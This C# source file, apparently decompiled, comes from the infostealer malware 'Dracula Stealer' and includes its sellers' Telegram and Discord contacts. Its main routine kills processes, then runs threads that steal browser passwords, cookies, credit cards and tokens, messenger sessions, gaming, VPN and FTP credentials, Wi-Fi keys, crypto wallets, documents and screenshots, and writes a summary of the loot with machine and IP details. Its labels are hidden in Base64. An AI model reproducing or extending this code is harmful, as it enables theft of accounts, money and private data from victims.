using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;
using Stealer.Steal.Helper;
using Stealer.Steal.Target.Browsers;
using Stealer.Steal.Target.Crypto;
using Stealer.Steal.Target.Gaming;
using Stealer.Steal.Target.Messangers;
using Stealer.Steal.Target.Server;
using Stealer.Steal.Target.Sys;
using Stealer.Steal.Target.VPN;

namespace Stealer.Steal.Target;

internal class Rage
{
	public static void Start()
	{
		ProcessKiller.Dump();
		List<Thread> list = new List<Thread>();
		list.Add(new Thread((ThreadStart)delegate
		{
			List<Thread> list4 = new List<Thread>();
			string[] array2 = BrowserSearcher.Chromium();
			foreach (string browser2 in array2)
			{
				list4.Add(new Thread((ThreadStart)delegate
				{
					new Chromium(browser2).Start();
				}));
			}
			foreach (Thread item in list4)
			{
				item.Start();
			}
			foreach (Thread item2 in list4)
			{
				item2.Join();
			}
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			List<Thread> list3 = new List<Thread>();
			string[] array = BrowserSearcher.Gecko();
			foreach (string browser in array)
			{
				list3.Add(new Thread((ThreadStart)delegate
				{
					new Gecko(browser).Start();
				}));
			}
			foreach (Thread item3 in list3)
			{
				item3.Start();
			}
			foreach (Thread item4 in list3)
			{
				item4.Join();
			}
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Discord.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Element.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Icq.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Outlook.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Pidgin.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Signal.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Skype.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Telegram.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Tox.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			BattleNet.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Minecraft.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Steam.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Uplay.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Roblox.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Epic.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Riot.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			NordVpn.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			OpenVpn.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			ProtonVpn.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			IpVanish.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			FileZilla.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Ngrok.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			PlayIt.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			CyberDuck.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Graber.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			GameList.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Device.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			InstalledPrograms.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			WifiKeys.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			ProductKey.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Processes.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			ScreenShot.Start();
		}));
		list.Add(new Thread((ThreadStart)delegate
		{
			Stealer.Steal.Target.Crypto.Crypto.Start();
		}));
		foreach (Thread item5 in list)
		{
			item5.Start();
		}
		foreach (Thread item6 in list)
		{
			item6.Join();
		}
		List<string> list2 = new List<string>
		{
			Encoding.Unicode.GetString(Convert.FromBase64String("sSjEKAAoACgAKAAoACgAKAAoACjAKCAoJCgkKOQoJCgkKAQowCgAKAAoACgAKAAoACjAKEAofCggAA==")),
			Encoding.Unicode.GetString(Convert.FromBase64String("ACgbKK8o/yjfKO8oVyj2KDIoQSiAKEAoJCgsKA8oJSgkKAAoQChpKJIozii9KP8o+ygvKB4oASggAA==")),
			Encoding.Unicode.GetString(Convert.FromBase64String("ACgAKAAoACiJKB0oEyi7KOQoeCgjKEAoACgAKAAoACgAKCAoGij0KH4oXygJKCMoQCgAKAAoACggAA==")),
			Encoding.Unicode.GetString(Convert.FromBase64String("ACgAKAAo4CjzKMYoFCgJKA8o/yhEKLEo5CiEKMAopCj0KEco8ChfKKkoASggKHQofyhEKAAoACggAA==")),
			Encoding.Unicode.GetString(Convert.FromBase64String("ACgAKKAoASiAKA4oACgAKBgo/Ch/KDsoGSjNKMAoPCg5KF8o/yjEKMMoACgAKBgoRCgIKEQoACggAA==")),
			Encoding.Unicode.GetString(Convert.FromBase64String("ACgAKAcogCjsKPYo7ChrKIsofCi3KFcogCiXKAkoJyhAKMoouCjnKNEo9CjtKPQo9ChEKDgoACggAA==")),
			Encoding.Unicode.GetString(Convert.FromBase64String("ACi4KAAoCCgJKBsoNyj+KP8oxyjvKOcoyyiJKH0oDSiZKP0ozij/KP8oJygfKAsoAShGKAAoRCggAA==")),
			Encoding.Unicode.GetString(Convert.FromBase64String("ACi4KIAoQCgAKIAoYCgYKIkofyj/KP8o/yhWKAEosCj/KP8o/yj/KEgoESgiKMAoACjnKEAoRyggAA==")),
			Encoding.Unicode.GetString(Convert.FromBase64String("ACgYKE4oDygWKBMoEigSKDoo/yhIKLcogygBKAAoDig8KH4oySj/KAcoACgAKAgogSgJKKsoACggAA==")),
			Encoding.Unicode.GetString(Convert.FromBase64String("ACgAKKEoACgQKEAoACgAKAAoOSj/KO4oIihHKAAouCgQKPUovygLKAAoACgAKAAoBigAKEwoACggAA==")),
			Encoding.Unicode.GetString(Convert.FromBase64String("ACgAKAAooygAKAgohCgAKAAoACgIKBkoRyhGKBAouCi4KAsoASgAKAAoACgAKAooAChcKAAoACggAA==")),
			Encoding.Unicode.GetString(Convert.FromBase64String("ACgAKAAoACgRKMQoACgRKIQoQCgAKAAo/yjmKOQo9Cj+KAAoACgAKEAoECgBKOAoCigAKAAoACggAA==")),
			Encoding.Unicode.GetString(Convert.FromBase64String("ACgAKAAoACgAKAgoEiikKH8oCCgQKAAoNCitKP8o7SguKAAoEigpKP4oZCgaKAEoACgAKAAoACggAA==")),
			Encoding.Unicode.GetString(Convert.FromBase64String("ACgAKAAoACgAKAAoACgAKAgoECgAKCQoACiIKPYoWCgAKCQoFCgCKAEoACgAKAAoACgAKAAoACggAA==")),
			Encoding.Unicode.GetString(Convert.FromBase64String("ACgAKAAoACgAKAAoACgAKAAoACgAKAAoACgAKBkoACgAKAAoACgAKAAoACgAKAAoACgAKAAoACggACAA")),
			"Dracula Stealer",
			"Contacts",
			"\tTelegram: @Quqwaq",
			"\tDiscord: #satanazastalina",
			"",
			""
		};
		if (Counter.Browsers.Count > 0)
		{
			list2.Add("Browsers");
			foreach (Browser browser3 in Counter.Browsers)
			{
				if (browser3.Passwords > 0 || browser3.Cookies > 0 || browser3.CreditCards > 0 || browser3.AutoFill > 0 || browser3.History > 0 || browser3.Bookmarks > 0 || browser3.Downloads > 0 || browser3.Tokens > 0 || browser3.Wallets > 0)
				{
					list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA82BDfIAA=")) + browser3.Name + " ");
					if (browser3.Passwords != 0)
					{
						list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQAJAD3YEd0gAFAAYQBzAHMAdwBvAHIAZABzADoAIAA=")) + browser3.Passwords + " ");
					}
					if (browser3.Cookies != 0)
					{
						list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQAJADzYat8gAEMAbwBvAGsAaQBlAHMAOgAgAA==")) + browser3.Cookies + " ");
					}
					if (browser3.CreditCards != 0)
					{
						list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQAJAD3Ys9wgAEMAcgBlAGQAaQB0AEMAYQByAGQAcwA6ACAA")) + browser3.CreditCards + " ");
					}
					if (browser3.AutoFill != 0)
					{
						list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQAJAD3YwtwgAEEAdQB0AG8ARgBpAGwAbAA6ACAA")) + browser3.AutoFill + " ");
					}
					if (browser3.History != 0)
					{
						list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQAJAPMjIABIAGkAcwB0AG8AcgB5ADoAIAA=")) + browser3.History + " ");
					}
					if (browser3.Bookmarks != 0)
					{
						list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQAJAD3YFt0gAEIAbwBvAGsAbQBhAHIAawBzADoAIAA=")) + browser3.Bookmarks + " ");
					}
					if (browser3.Downloads != 0)
					{
						list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQAJAD3Y5twgAEQAbwB3AG4AbABvAGEAZABzADoAIAA=")) + browser3.Downloads + " ");
					}
					if (browser3.Tokens != 0)
					{
						list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQAJADzYqN8gAFIAZQBzAHQAbwByAGUAVABvAGsAZQBuAHMAOgAgAA==")) + browser3.Tokens + " ");
					}
					if (browser3.Wallets != 0)
					{
						list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQAJAD7Yyt0gAFcAYQBsAGwAZQB0AHMAOgAgAA==")) + browser3.Wallets + " ");
					}
					list2.Add("");
				}
			}
		}
		list2.Add("Software");
		if (Counter.Wallets != 0)
		{
			list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQBEJw/+IABXAGEAbABsAGUAdABzACAAQQBwAHAAOgAgAA==")) + Counter.Wallets);
		}
		if (Counter.Vpn != 0)
		{
			list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA92AzdIABWAHAAbgAgAEEAcABwADoAIAA=")) + Counter.Vpn);
		}
		if (Counter.Pidgin != 0)
		{
			list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA+2KLdIABQAGkAZABnAGkAbgAgAEEAcABwADoAIAA=")) + Counter.Pidgin);
		}
		if (Counter.FtpHosts != 0)
		{
			list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA92PDeD/4gAEYAdABwAEgAbwBzAHQAcwAgAEEAcABwADoAIAA=")) + Counter.FtpHosts);
		}
		if (Counter.DiscordTokens != 0)
		{
			list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA92H7cIABEAGkAcwBjAG8AcgBkACAAVABvAGsAZQBuAHMAOgAgAA==")) + Counter.DiscordTokens);
		}
		if (Counter.Outlook)
		{
			list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA92OvcIABPAHUAdABsAG8AbwBrACAAYQBjAGMAbwB1AG4AdABzAA==")));
		}
		if (Counter.Telegram)
		{
			list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQAIJw/+IABUAGUAbABlAGcAcgBhAG0AIABzAGUAcwBzAGkAbwBuAHMA")));
		}
		if (Counter.Skype)
		{
			list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQABJg/+IABTAGsAeQBwAGUAIABzAGUAcwBzAGkAbwBuAA==")));
		}
		if (Counter.Discord)
		{
			list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA92H7cIABEAGkAcwBjAG8AcgBkACAAdABvAGsAZQBuAA==")));
		}
		if (Counter.Element)
		{
			list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA92KzcIABFAGwAZQBtAGUAbgB0ACAAcwBlAHMAcwBpAG8AbgA=")));
		}
		if (Counter.Signal)
		{
			list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA92K3cIABTAGkAZwBuAGEAbAAgAHMAZQBzAHMAaQBvAG4A")));
		}
		if (Counter.Tox)
		{
			list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA92BPdIABUAG8AeAAgAHMAZQBzAHMAaQBvAG4A")));
		}
		if (Counter.Steam)
		{
			list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA82K7fIABTAHQAZQBhAG0AIABzAGUAcwBzAGkAbwBuAA==")));
		}
		if (Counter.Uplay)
		{
			list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA82K7fIABVAHAAbABhAHkAIABzAGUAcwBzAGkAbwBuAA==")));
		}
		if (Counter.BattleNet)
		{
			list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA82K7fIABCAGEAdAB0AGwAZQBOAEUAVAAgAHMAZQBzAHMAaQBvAG4A")));
		}
		if (Counter.Minecraft)
		{
			list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA82K7fIABNAGkAbgBlAGMAcgBhAGYAdAA=")));
		}
		list2.Add("Grabber");
		list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA92BHdIABEAG8AYwB1AG0AZQBuAHQAcwA6ACAA")) + Counter.GrabberDocuments);
		list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA92LPcIABEAGEAdABhAEIAYQBzAGUAOgAgAA==")) + Counter.GrabberDatabases);
		list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA82GrfIABTAG8AdQByAGMAZQBDAG8AZABlADoAIAA=")) + Counter.GrabberSourceCodes);
		list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQA92MLcIABJAG0AYQBnAGUAOgAgAA==")) + Counter.GrabberImages);
		list2.Add("Info");
		list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQCZJg/+IABQAHIAbwBjAGUAcwBzAGUAcwA6ACAA")) + Counter.CountProcess);
		list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQCZJg/+IABQAHIAbwBnAHIAYQBtAHMAOgAgAA==")) + Counter.CountPrograms);
		list2.Add(Encoding.Unicode.GetString(Convert.FromBase64String("CQCZJg/+IABEAGUAdgBpAGMAZQBzADoAIAA=")) + Counter.CountDevice);
		list2.Add("\tIP");
		list2.Add("\t\tExternal IP: " + SystemInfo.GetPublicIpAsync());
		list2.Add("\t\tInternal IP: " + SystemInfo.GetLocalIp());
		list2.Add("\t\tGateway IP: " + SystemInfo.GetDefaultGateway());
		list2.Add("\tMachine");
		list2.Add("\t\tUsername: " + SystemInfo.Username);
		list2.Add("\t\tCompname: " + SystemInfo.Compname);
		list2.Add("\t\tSystem: " + SystemInfo.GetSystemVersion());
		list2.Add("\t\tCPU: " + SystemInfo.GetCpuName());
		list2.Add("\t\tGPU: " + SystemInfo.GetGpuName());
		list2.Add("\t\tRAM: " + SystemInfo.GetRamAmount());
		list2.Add("\t\tDATE: " + SystemInfo.Datenow);
		list2.Add("\t\tSCREEN: " + SystemInfo.ScreenMetrics());
		list2.Add("\t\tACTIVE WINDOW: " + SystemInfo.GetActiveWindowTitle());
		DynamicFiles.WriteAllText(Path.Combine("Information.txt"), string.Join("\n", (IEnumerable<string?>)list2.ToArray()));
	}
}
